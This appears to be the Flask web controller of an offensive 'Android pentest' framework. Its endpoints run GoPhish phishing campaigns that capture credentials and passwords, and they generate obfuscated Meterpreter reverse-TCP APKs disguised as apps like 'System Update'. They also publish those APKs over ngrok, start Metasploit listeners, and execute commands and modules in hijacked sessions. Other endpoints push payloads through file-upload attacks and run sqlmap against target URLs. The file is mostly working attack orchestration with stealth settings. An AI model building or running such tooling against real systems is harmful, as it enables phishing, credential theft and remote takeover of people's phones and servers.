# web/app.py
import time
from flask import Flask, abort, render_template, request, jsonify, send_file, session, redirect, url_for
import os
import json
import logging
from datetime import datetime
import yaml
from urllib.parse import urljoin

# 导入核心模块
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from core.decision_engine import DecisionEngine
from core.gophish_client import GoPhishClient
from core.main_controller import AndroidPentestController
from core.scanner import  Scanner
from core.social_engineer import SocialEngineer
from core.payload_generator import PayloadGenerator
from core.task_manager import TaskManager

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = 'android_pentest_framework_secret_key_2024'
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

# 全局变量
controller = None
current_attack = None
task_manager = TaskManager()

def load_config():
    """加载配置文件"""
    try:
        with open('config/config.yaml', 'r') as f:
            return yaml.safe_load(f)
    except Exception as e:
        logger.error(f"加载配置文件失败: {e}")
        return {}

@app.route('/')
def index():
    """首页"""
    config = load_config()
    return render_template('index.html', config=config)

@app.route('/dashboard')
def dashboard():
    """控制面板"""
    global controller, current_attack
    
    status = {
        "controller_ready": controller is not None,
        "current_attack": current_attack,
        "timestamp": datetime.now().isoformat()
    }
    
    if controller:
        status.update(controller.get_system_status())
    
    return render_template('dashboard.html', status=status)

@app.route('/phishing')
def phishing_ui():
    """钓鱼攻击界面"""
    payload_gen = PayloadGenerator()
    payloads = payload_gen.list_payloads()
    return render_template('phishing.html', payloads=payloads)

@app.route('/scanning')
def scanning_ui():
    """扫描界面"""
    return render_template('scanning.html')

@app.route('/sqli')
def sqli_ui():
    """SQL注入攻击界面"""
    return render_template('sqli.html')

@app.route('/results')
def results_ui():
    """结果页面"""
    return render_template('results.html')

# API 路由

@app.route('/api/init', methods=['POST'])
def api_init():
    """初始化控制器"""
    global controller
    try:
        data = request.json
        lhost = data.get('lhost', '0.0.0.0')
        
        controller = AndroidPentestController(lhost=lhost)
        
        # 将LHOST保存到session中
        session['lhost'] = lhost
        session['controller_initialized'] = True
        
        return jsonify({
            "success": True,
            "message": "控制器初始化成功",
            "lhost": lhost
        })
    except Exception as e:
        logger.error(f"控制器初始化失败: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        })

@app.route('/msfrpc-help')
def msfrpc_help():
    """MSF RPC帮助页面"""
    return render_template('msfrpc_help.html')

@app.route('/config-info')
def config_info():
    """配置信息页面"""
    return render_template('config_info.html')

@app.route('/api/config-info')
def api_config_info():
    """获取脱敏后的配置信息"""
    config = load_config()

    def mask(value, show=4):
        """对敏感字符串进行脱敏，仅保留头尾若干字符"""
        s = str(value) if value else ''
        if len(s) <= show * 2:
            return '*' * len(s)
        return s[:show] + '*' * (len(s) - show * 2) + s[-show:]

    port_map = [
        {"port": config.get('web', {}).get('port', 5000),      "protocol": "TCP", "service": "Flask Web UI",        "description": "框架管理控制台，浏览器访问入口"},
        {"port": config.get('ngrok', {}).get('default_port', 8080), "protocol": "TCP", "service": "Ngrok 隧道",    "description": "Payload 分发 / 钓鱼页面对外隧道端口"},
        {"port": config.get('metasploit', {}).get('default_lport', 4444), "protocol": "TCP", "service": "Meterpreter 监听", "description": "Android Meterpreter 反弹 Shell 回连端口"},
        {"port": 3333,  "protocol": "TCP", "service": "GoPhish 管理/API", "description": "GoPhish 管理后台及 REST API 接口"},
        {"port": 8081,  "protocol": "TCP", "service": "GoPhish 钓鱼页面",  "description": "GoPhish 对外投放的钓鱼登录页面"},
        {"port": config.get('metasploit', {}).get('msfrpc_port', 55553), "protocol": "TCP", "service": "Metasploit MSFRPC", "description": "Metasploit 远程过程调用服务，供框架内部调用"},
    ]

    result = {
        "app": {
            "name":    config.get('app', {}).get('name', ''),
            "version": config.get('app', {}).get('version', ''),
            "debug":   config.get('app', {}).get('debug', False),
        },
        "ngrok": {
            "enabled":      config.get('ngrok', {}).get('enabled', False),
            "auth_token":   mask(config.get('ngrok', {}).get('auth_token', '')),
            "default_port": config.get('ngrok', {}).get('default_port', 8080),
        },
        "gophish": {
            "enabled":   config.get('gophish', {}).get('enabled', False),
            "api_key":   mask(config.get('gophish', {}).get('api_key', '')),
            "base_url":  config.get('gophish', {}).get('base_url', ''),
            "admin_url": config.get('gophish', {}).get('admin_url', ''),
        },
        "web": {
            "host":  config.get('web', {}).get('host', '0.0.0.0'),
            "port":  config.get('web', {}).get('port', 5000),
            "debug": config.get('web', {}).get('debug', False),
        },
        "metasploit": {
            "default_payload":  config.get('metasploit', {}).get('default_payload', ''),
            "default_lhost":    config.get('metasploit', {}).get('default_lhost', '0.0.0.0'),
            "default_lport":    config.get('metasploit', {}).get('default_lport', 4444),
            "msfrpc_port":      config.get('metasploit', {}).get('msfrpc_port', 55553),
            "msfrpc_password":  mask(config.get('metasploit', {}).get('msfrpc_password', '')),
            "msfrpc_auto_start":config.get('metasploit', {}).get('msfrpc_auto_start', False),
        },
        "scanning": {
            "nmap_options": config.get('scanning', {}).get('nmap_options', ''),
            "timeout":      config.get('scanning', {}).get('timeout', 300),
        },
        "stealth": {
            "default_level":     config.get('stealth', {}).get('default_level', 'medium'),
            "available_encoders":config.get('stealth', {}).get('available_encoders', []),
            "max_iterations":    config.get('stealth', {}).get('max_iterations', 10),
        },
        "logging": {
            "level": config.get('logging', {}).get('level', 'INFO'),
            "file":  config.get('logging', {}).get('file', ''),
        },
        "port_map": port_map,
    }
    return jsonify(result)

@app.route('/api/config/get')
def api_config_get():
    """获取当前配置（供前端使用，非敏感信息）"""
    return jsonify({
        "lhost": session.get('lhost', '0.0.0.0'),
        "controller_initialized": session.get('controller_initialized', False)
    })

@app.route('/api/scan', methods=['POST'])
def api_scan():
    """执行扫描"""
    global task_manager
    try:
        data = request.json
        target = data.get('target')
        scan_type = data.get('scan_type', 'quick')
        
        if not target:
            return jsonify({"success": False, "error": "目标不能为空"})
        
        # 自动使用session中的LHOST
        lhost = session.get('lhost', '0.0.0.0')
        
        # 创建任务
        task_id = task_manager.create_task('scan', target, {'scan_type': scan_type})
        task_manager.update_task(task_id, status='running', progress=10)
        
        scanner = Scanner()
        results = scanner.scan_target(target, scan_type)
        
        # 保存扫描结果到session
        session['last_scan'] = {
            "target": target,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        # 更新任务状态
        task_manager.update_task(task_id, status='completed', progress=100, result={
            "target": target, "scan_type": scan_type, "results": results
        })
        
        return jsonify({
            "success": True,
            "task_id": task_id,
            "target": target,
            "scan_type": scan_type,
            "lhost": lhost,
            "results": results
        })
        
    except Exception as e:
        logger.error(f"扫描失败: {e}")
        if 'task_id' in locals():
            task_manager.update_task(task_id, status='failed', error=str(e))
        return jsonify({"success": False, "error": str(e)})
    

@app.route('/api/phishing/attack', methods=['POST'])
def api_phishing_attack():
    """执行钓鱼攻击（支持选择GoPhish资源）"""
    global controller, current_attack
    try:
        data = request.json
        
        # 确保控制器已初始化
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        attack_name = data.get('attack_name', 'Android Security Update')
        app_name = data.get('app_name', 'System Update')
        use_gophish = data.get('use_gophish', False)
        stealth_level = data.get('stealth_level', 'medium')
        architecture = data.get('architecture', 'arm')
        lport = data.get('lport', 4444)
        
        # 同步LHOST和LPORT到social_engineer和attacker模块
        lhost = data.get('lhost') or session.get('lhost', '0.0.0.0')
        if controller.social_engineer:
            controller.social_engineer.lhost = lhost
            controller.social_engineer.lport = lport
        if controller.attacker:
            controller.attacker.lhost = lhost
            controller.attacker.lport = lport
        
        # 获取apktool配置
        use_apktool = data.get('use_apktool', False)
        template_apk = data.get('template_apk')
        disguise_config = data.get('disguise_config')
        
        # 获取GoPhish资源ID（如果提供了）
        gophish_group = data.get('gophish_group')
        gophish_template = data.get('gophish_template')
        gophish_page = data.get('gophish_page')
        gophish_profile = data.get('gophish_profile')
        
        logger.info(f"开始钓鱼攻击: {attack_name}, LPORT: {lport}")
        logger.info(f"使用GoPhish: {use_gophish}")
        logger.info(f"使用apktool: {use_apktool}")
        if use_gophish:
            logger.info(f"GoPhish资源 - 用户组: {gophish_group}, 模板: {gophish_template}, 页面: {gophish_page}, 配置: {gophish_profile}")
        if use_apktool:
            logger.info(f"apktool配置 - 模板: {template_apk}, 伪装: {disguise_config}")
        
        # 执行钓鱼攻击 - 传递GoPhish资源参数和apktool配置
        result = controller.execute_phishing_attack(
            attack_name=attack_name,
            app_name=app_name,
            use_gophish=use_gophish,
            stealth_level=stealth_level,
            architecture=architecture,
            gophish_group=gophish_group,
            gophish_template=gophish_template,
            gophish_page=gophish_page,
            gophish_profile=gophish_profile,
            use_apktool=use_apktool,
            template_apk=template_apk,
            disguise_config=disguise_config
        )
        
        # 确保返回的数据结构包含前端需要的所有字段
        if result.get('success'):
            # 获取ngrok URL
            ngrok_url = result.get('ngrok_url', '')
            payload_info = result.get('payload', {})
            payload_name = payload_info.get('payload_name', '')
            
            # 构建正确的URL
            if ngrok_url and payload_name:
                result['download_url'] = f"{ngrok_url}/{payload_name}"
                result['phishing_url'] = f"{ngrok_url}"
            
            # 确保有listener_info字段
            if 'listener' in result:
                result['listener_info'] = result['listener']
            elif not result.get('listener_info'):
                # 如果没有监听器信息，创建一个默认的
                result['listener_info'] = {
                    'lhost': session.get('lhost', '0.0.0.0'),
                    'lport': data.get('lport', 4444)
                }
            
            # 添加GoPhish使用状态
            result['use_gophish'] = use_gophish
            
            # 如果有GoPhish活动数据，添加到结果中
            if use_gophish and 'phishing_result' in result:
                phishing_result = result.get('phishing_result', {})
                if phishing_result.get('type') == 'gophish':
                    result['gophish_campaign'] = phishing_result.get('campaign_data', {})
        
        # 保存攻击信息
        current_attack = {
            "type": "phishing",
            "name": attack_name,
            "start_time": datetime.now().isoformat(),
            "result": result
        }
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"钓鱼攻击失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/phishing/status')
def api_phishing_status():
    """获取钓鱼攻击状态"""
    global controller, current_attack
    
    if not controller:
        return jsonify({"active": False, "message": "控制器未初始化"})
    
    status = controller.social_engineer.get_attack_status()
    status["current_attack"] = current_attack
    
    return jsonify(status)

@app.route('/api/phishing/stop', methods=['POST'])
def api_phishing_stop():
    """停止钓鱼攻击"""
    global controller, current_attack
    
    if controller:
        result = controller.social_engineer.stop_phishing_attack()
        current_attack = None
        return jsonify({"success": result, "message": "钓鱼攻击已停止"})
    else:
        return jsonify({"success": False, "error": "控制器未初始化"})

@app.route('/api/payloads/generate', methods=['POST'])
def api_generate_payload():
    """生成载荷（支持apktool深度伪装）"""
    try:
        data = request.json
        # 优先使用session中的LHOST，如果请求中有则使用请求的
        lhost = data.get('lhost') or session.get('lhost', '0.0.0.0')
        lport = data.get('lport', 4444)
        app_name = data.get('app_name', 'System Update')
        architecture = data.get('architecture', 'arm')
        stealth_level = data.get('stealth_level', 'medium')
        
        # apktool配置
        use_apktool = data.get('use_apktool', False)
        template_apk = data.get('template_apk')
        disguise_config = data.get('disguise_config')

        payload_gen = PayloadGenerator()
        
        # 如果使用apktool深度伪装
        if use_apktool and template_apk:
            logger.info(f"使用apktool生成载荷，模板: {template_apk}")
            result = payload_gen.generate_android_payload(
                lhost=lhost,
                lport=lport,
                app_name=app_name,
                architecture=architecture,
                use_apktool=True,
                template_apk=template_apk,
                disguise_config=disguise_config,
                obfuscation_level=3 if stealth_level == "high" else 2
            )
        else:
            # 未选择apktool时，始终使用基础生成，确保回连正常
            result = payload_gen.generate_android_payload(
                lhost=lhost,
                lport=lport,
                app_name=app_name,
                architecture=architecture
            )
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"生成载荷失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/payloads/list')
def api_list_payloads():
    """列出所有载荷"""
    payload_gen = PayloadGenerator()
    payloads = payload_gen.list_payloads()
    return jsonify({"success": True, "payloads": payloads})

@app.route('/api/listener/start', methods=['POST'])
def api_start_listener():
    """启动监听器"""
    global controller
    try:
        data = request.json
        
        if not controller:
            # 使用session中的LHOST
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        lport = data.get('lport', 4444)
        payload_type = data.get('payload_type', 'android/meterpreter/reverse_tcp')
        
        result = controller.attacker.start_msf_listener(
            payload_type=payload_type,
            lport=lport
        )
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/listener/stop', methods=['POST'])
def api_stop_listener():
    """停止监听器"""
    global controller
    
    if controller:
        result = controller.attacker.stop_listener()
        return jsonify({"success": result, "message": "监听器已停止"})
    else:
        return jsonify({"success": False, "error": "控制器未初始化"})

@app.route('/api/listener/status')
def api_listener_status():
    """获取监听器状态"""
    global controller
    
    if controller:
        status = controller.attacker.get_listener_status()
        return jsonify(status)
    else:
        return jsonify({"running": False})

@app.route('/api/system/status')
def api_system_status():
    """获取系统状态"""
    global controller, current_attack
    
    status = {
        "controller_ready": controller is not None,
        "current_attack": current_attack,
        "timestamp": datetime.now().isoformat()
    }
    
    if controller:
        status.update(controller.get_system_status())
    
    return jsonify(status)

@app.route('/api/ngrok/start', methods=['POST'])
def api_start_ngrok():
    """启动Ngrok"""
    global controller
    try:
        data = request.json
        port = data.get('port', 8080)
        
        if not controller:
            controller = AndroidPentestController()
        
        result = controller.ngrok.start_ngrok(port=port)
        
        return jsonify({
            "success": bool(result),
            "ngrok_url": result,
            "message": "Ngrok启动成功" if result else "Ngrok启动失败"
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/ngrok/stop', methods=['POST'])
def api_stop_ngrok():
    """停止Ngrok"""
    global controller
    
    if controller:
        controller.ngrok.stop_ngrok()
        return jsonify({"success": True, "message": "Ngrok已停止"})
    else:
        return jsonify({"success": False, "error": "控制器未初始化"})

@app.route('/api/ngrok/status')
def api_ngrok_status():
    """获取Ngrok状态"""
    global controller
    
    if controller:
        running = controller.ngrok.is_running()
        url = controller.ngrok.get_public_url() if running else None
        return jsonify({"running": running, "url": url})
    else:
        return jsonify({"running": False})

if __name__ == '__main__':
    # 确保日志目录存在
    os.makedirs('logs', exist_ok=True)
    os.makedirs('payloads', exist_ok=True)
    
    config = load_config()
    web_config = config.get('web', {})
    
    app.run(
        host=web_config.get('host', '0.0.0.0'),
        port=web_config.get('port', 5000),
        debug=web_config.get('debug', True)
    )

# sessions
# web/app.py

@app.route('/api/sessions/list')
def api_list_sessions():
    """获取所有活跃会话 - 改进数据返回"""
    global controller
    if not controller:
        try:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        except Exception as e:
            return jsonify({"success": False, "error": f"控制器初始化失败: {str(e)}"})
    
    try:
        sessions = controller.attacker.get_sessions()
        
        # 转换会话数据为前端友好格式
        formatted_sessions = {}
        for session_id, session_data in sessions.items():
            formatted_sessions[session_id] = {
                "id": session_data.get("id", session_id),
                "type": session_data.get("type", "unknown"),
                "target_host": session_data.get("target_host", "unknown"),
                "username": session_data.get("username", "unknown"),
                "timestamp": session_data.get("timestamp", time.time()),
                "last_activity": session_data.get("last_activity", time.time()),
                "verified": session_data.get("verified", False),
                "info": session_data.get("info", ""),
                "via_exploit": session_data.get("via_exploit", ""),
                "via_payload": session_data.get("via_payload", ""),
                "status": "active"
            }
        
        return jsonify({
            "success": True,
            "sessions": formatted_sessions,
            "count": len(sessions),
            "timestamp": time.time()
        })
    except Exception as e:
        logger.error(f"获取会话列表失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sessions/<session_id>/info')
def api_session_info(session_id):
    """获取会话信息"""
    global controller
    if not controller:
        return jsonify({"success": False, "error": "控制器未初始化"})
    
    try:
        session_info = controller.attacker.get_session_info(session_id)
        if session_info:
            return jsonify({"success": True, "session": session_info})
        else:
            return jsonify({"success": False, "error": "会话不存在"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sessions/<session_id>/command', methods=['POST'])
def api_execute_command(session_id):
    """在会话中执行命令"""
    global controller
    if not controller:
        return jsonify({"success": False, "error": "控制器未初始化"})
    
    try:
        data = request.json
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({"success": False, "error": "命令不能为空"})
        
        result = controller.attacker.execute_command(session_id, command)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sessions/<session_id>/module', methods=['POST'])
def api_run_module(session_id):
    """在会话中运行模块"""
    global controller
    if not controller:
        return jsonify({"success": False, "error": "控制器未初始化"})
    
    try:
        data = request.json
        module_name = data.get('module_name', '').strip()
        options = data.get('options', {})
        
        if not module_name:
            return jsonify({"success": False, "error": "模块名不能为空"})
        
        result = controller.attacker.run_meterpreter_module(session_id, module_name, options)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/commands/common')
def api_common_commands():
    """获取常用命令列表"""
    global controller
    if not controller:
        try:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        except Exception as e:
            return jsonify({"success": False, "error": f"控制器初始化失败: {str(e)}"})
    
    try:
        commands = controller.attacker.get_common_commands()
        return jsonify({"success": True, "commands": commands})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sessions/debug')
def api_sessions_debug():
    """获取会话调试信息"""
    global controller
    if not controller:
        try:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        except Exception as e:
            return jsonify({"success": False, "error": f"控制器初始化失败: {str(e)}"})
    
    try:
        debug_info = controller.attacker.debug_sessions()
        return jsonify({
            "success": True,
            "debug_info": debug_info
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})
    

@app.route('/sessions')
def sessions_ui():
    """会话管理界面"""
    return render_template('sessions.html')


@app.route('/file-upload')
def file_upload_ui():
    """文件上传攻击界面"""
    return render_template('file_upload.html')

@app.route('/api/attack/file-upload', methods=['POST'])
def api_file_upload_attack():
    """执行文件上传攻击"""
    global controller
    if not controller:
        return jsonify({"success": False, "error": "控制器未初始化"})
    
    try:
        data = request.json
        target_url = data.get('target_url')
        lhost = data.get('lhost', '0.0.0.0')
        lport = data.get('lport', 4444)
        architecture = data.get('architecture', 'arm')
        stealth_level = data.get('stealth_level', 'medium')
        
        # 高级选项
        custom_payload_name = data.get('custom_payload_name')
        bypass_technique = data.get('bypass_technique', 'none')
        manual_endpoints = data.get('manual_endpoints')
        verify_upload = data.get('verify_upload', False)
        auto_trigger = data.get('auto_trigger', True)
        
        if not target_url:
            return jsonify({"success": False, "error": "目标URL不能为空"})
        
        # 确保控制器使用正确的LHOST
        if not controller or controller.lhost != lhost:
            controller = AndroidPentestController(lhost=lhost)
        
        # 解析手动指定的端点
        manual_endpoints_list = None
        if manual_endpoints:
            manual_endpoints_list = [
                {'url': urljoin(target_url, path.strip()), 'path': path.strip(), 'confidence': 100}
                for path in manual_endpoints.split('\n')
                if path.strip()
            ]
        
        result = controller._file_upload_attack(
            target=target_url,
            architecture=architecture,
            stealth_level=stealth_level,
            custom_payload_name=custom_payload_name,
            bypass_technique=bypass_technique,
            manual_endpoints=manual_endpoints_list,
            verify_upload=verify_upload,
            auto_trigger=auto_trigger
        )
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"文件上传攻击失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/scan/upload-endpoints', methods=['POST'])
def api_scan_upload_endpoints():
    """扫描文件上传端点"""
    global controller
    if not controller:
        return jsonify({"success": False, "error": "控制器未初始化"})
    
    try:
        data = request.json
        target_url = data.get('target_url')
        
        if not target_url:
            return jsonify({"success": False, "error": "目标URL不能为空"})
        
        result = controller.scan_upload_endpoints(target_url)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"扫描上传端点失败: {e}")
        return jsonify({"success": False, "error": str(e)})
    
# GoPhish管理路由
@app.route('/gophish/management')
def gophish_management():
    """GoPhish配置管理页面"""
    return render_template('gophish_management.html')

# GoPhish API路由
@app.route('/api/gophish/status')
def gophish_status():
    """获取GoPhish系统状态"""
    try:
        client = GoPhishClient()
        status = client.get_system_status()
        return jsonify(status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/groups', methods=['GET', 'POST'])
def gophish_groups():
    """用户组管理"""
    try:
        client = GoPhishClient()
        if request.method == 'GET':
            groups = client.get_groups()
            return jsonify(groups)
        else:
            data = request.json
            group = client.create_group(data['name'], data['targets'])
            return jsonify(group) if group else jsonify({'error': '创建失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/groups/<int:group_id>', methods=['DELETE'])
def delete_gophish_group(group_id):
    """删除用户组"""
    try:
        client = GoPhishClient()
        success = client.delete_group(group_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/templates', methods=['GET', 'POST'])
def gophish_templates():
    """邮件模板管理"""
    try:
        client = GoPhishClient()
        if request.method == 'GET':
            templates = client.get_templates()
            return jsonify(templates)
        else:
            data = request.json
            template = client.create_template(
                name=data['name'],
                subject=data['subject'],
                html_content=data['html'],
                from_address=data.get('from_address', '')
            )
            return jsonify(template) if template else jsonify({'error': '创建失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/templates/<int:template_id>', methods=['DELETE'])
def delete_gophish_template(template_id):
    """删除邮件模板"""
    try:
        client = GoPhishClient()
        success = client.delete_template(template_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/pages', methods=['GET', 'POST'])
def gophish_pages():
    """钓鱼页面管理"""
    try:
        client = GoPhishClient()
        if request.method == 'GET':
            pages = client.get_pages()
            return jsonify(pages)
        else:
            data = request.json
            page = client.create_page(
                name=data['name'],
                html_content=data['html'],
                capture_credentials=data.get('capture_credentials', True),
                capture_passwords=data.get('capture_passwords', True)
            )
            return jsonify(page) if page else jsonify({'error': '创建失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/pages/<int:page_id>', methods=['DELETE'])
def delete_gophish_page(page_id):
    """删除钓鱼页面"""
    try:
        client = GoPhishClient()
        success = client.delete_page(page_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/profiles', methods=['GET', 'POST'])
def gophish_profiles():
    """发送配置管理"""
    try:
        client = GoPhishClient()
        if request.method == 'GET':
            profiles = client.get_sending_profiles()
            return jsonify(profiles)
        else:
            data = request.json
            profile = client.create_sending_profile(
                name=data['name'],
                host=data['host'],
                username=data['username'],
                password=data['password'],
                from_address=data['from_address'],
                port=data.get('port', 587)
            )
            return jsonify(profile) if profile else jsonify({'error': '创建失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/profiles/<int:profile_id>', methods=['DELETE'])
def delete_gophish_profile(profile_id):
    """删除发送配置"""
    try:
        client = GoPhishClient()
        success = client.delete_sending_profile(profile_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/campaigns', methods=['GET', 'POST'])
def gophish_campaigns():
    """活动管理"""
    try:
        client = GoPhishClient()
        if request.method == 'GET':
            campaigns = client.get_campaigns()
            return jsonify(campaigns)
        else:
            data = request.json
            campaign = client.create_campaign(
                name=data['name'],
                template_id=data['template'],
                page_id=data['page'],
                groups=data['groups'],
                url=data['url'],
                sending_profile_id=data['profile']
            )
            return jsonify(campaign) if campaign else jsonify({'error': '创建失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/campaigns/<int:campaign_id>', methods=['DELETE'])
def delete_gophish_campaign(campaign_id):
    """删除活动"""
    try:
        client = GoPhishClient()
        success = client.delete_campaign(campaign_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/campaigns/<int:campaign_id>/launch', methods=['POST'])
def launch_gophish_campaign(campaign_id):
    """启动活动"""
    try:
        client = GoPhishClient()
        success = client.launch_campaign(campaign_id)
        return jsonify({'success': success})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/gophish/campaigns/<int:campaign_id>/results')
def gophish_campaign_results(campaign_id):
    """获取活动结果"""
    try:
        client = GoPhishClient()
        results = client.get_campaign_results(campaign_id)
        return jsonify(results) if results else jsonify({'error': '获取失败'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ================================================================
# 新增: 综合扫描和智能决策API路由
# ================================================================

@app.route('/api/scan/comprehensive', methods=['POST'])
def api_comprehensive_scan():
    """执行综合扫描（5大扫描功能）"""
    global controller, task_manager
    try:
        data = request.json
        target = data.get('target')
        
        if not target:
            return jsonify({"success": False, "error": "目标不能为空"})
        
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        # 创建任务
        task_id = task_manager.create_task('comprehensive_scan', target)
        task_manager.update_task(task_id, status='running', progress=5)
        
        result = controller.comprehensive_scan(target)
        
        # 保存到session
        if result.get("success"):
            session['last_comprehensive_scan'] = {
                "target": target,
                "intelligence": result.get("intelligence"),
                "timestamp": datetime.now().isoformat()
            }
            task_manager.update_task(task_id, status='completed', progress=100, result=result)
        else:
            task_manager.update_task(task_id, status='failed', error=result.get('error', '扫描失败'))
        
        result['task_id'] = task_id
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"综合扫描失败: {e}")
        if 'task_id' in locals():
            task_manager.update_task(task_id, status='failed', error=str(e))
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/decision/analyze', methods=['POST'])
def api_decision_analyze():
    """调用决策引擎分析情报"""
    global controller
    try:
        data = request.json
        intelligence = data.get('intelligence')
        user_preference = data.get('user_preference')
        
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        # 如果没有提供情报，尝试使用缓存的
        if not intelligence:
            last_scan = session.get('last_comprehensive_scan')
            if last_scan:
                intelligence = last_scan.get('intelligence')
        
        if not intelligence:
            return jsonify({"success": False, "error": "无可用情报数据，请先执行综合扫描"})
        
        result = controller.analyze_and_decide(intelligence, user_preference)
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"决策分析失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/scan-and-decide', methods=['POST'])
def api_scan_and_decide():
    """一键综合扫描 + 智能决策"""
    global controller, task_manager
    try:
        data = request.json
        target = data.get('target')
        user_preference = data.get('user_preference')
        
        if not target:
            return jsonify({"success": False, "error": "目标不能为空"})
        
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        # 创建任务
        task_id = task_manager.create_task('scan_and_decide', target, {'user_preference': user_preference})
        task_manager.update_task(task_id, status='running', progress=5)
        
        result = controller.scan_and_decide(target, user_preference)
        
        # 保存到session
        if result.get("success"):
            session['last_scan_and_decide'] = {
                "target": target,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            task_manager.update_task(task_id, status='completed', progress=100, result=result)
        else:
            task_manager.update_task(task_id, status='failed', error=result.get('error', '流程失败'))
        
        result['task_id'] = task_id
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"扫描决策流程失败: {e}")
        if 'task_id' in locals():
            task_manager.update_task(task_id, status='failed', error=str(e))
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/attack-chains/list')
def api_list_attack_chains():
    """列出所有可用攻击链"""
    global controller
    try:
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        result = controller.list_attack_chains()
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"获取攻击链列表失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/scan/web-recon', methods=['POST'])
def api_web_recon():
    """执行Web应用侦察"""
    global controller
    try:
        data = request.json
        target = data.get('target')
        ports = data.get('ports')  # 可选，指定端口列表
        
        if not target:
            return jsonify({"success": False, "error": "目标不能为空"})
        
        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)
        
        result = controller.scanner.web_recon(target, ports)
        return jsonify({"success": True, "data": result})
        
    except Exception as e:
        logger.error(f"Web侦察失败: {e}")
        return jsonify({"success": False, "error": str(e)})

# ================================================================
# SQL注入攻击API路由
# ================================================================

@app.route('/api/sqli/detect', methods=['POST'])
def api_sqli_detect():
    """检测SQL注入点"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        method = data.get('method', 'GET')
        params = data.get('params')
        post_data = data.get('data')
        cookie = data.get('cookie')

        if not target_url:
            return jsonify({"success": False, "error": "目标URL不能为空"})

        if not controller:
            lhost = session.get('lhost', '0.0.0.0')
            controller = AndroidPentestController(lhost=lhost)

        result = controller.sqli_detect(target_url, method, params, post_data, cookie)
        return jsonify(result)
    except Exception as e:
        logger.error(f"SQL注入检测失败: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/sqli/sqlmap-scan', methods=['POST'])
def api_sqli_sqlmap_scan():
    """使用sqlmap执行扫描"""
    global controller
    try:
        data = request.json
        target_url = data.get('target_url')
        method = data.get('method', 'GET')
        post_data = data.get('data')
        cookie = data.get('cookie')
        level = data.get('level', 3)
        risk = data.get('risk', 2)
        technique = data.get('technique')
        tamper = data.get('tamper')
        extra_args = data.get('extra_args')

        if not target_url:
            return jsonify({"success": False, "error": "目标URL不能为空"})

        if not controller:
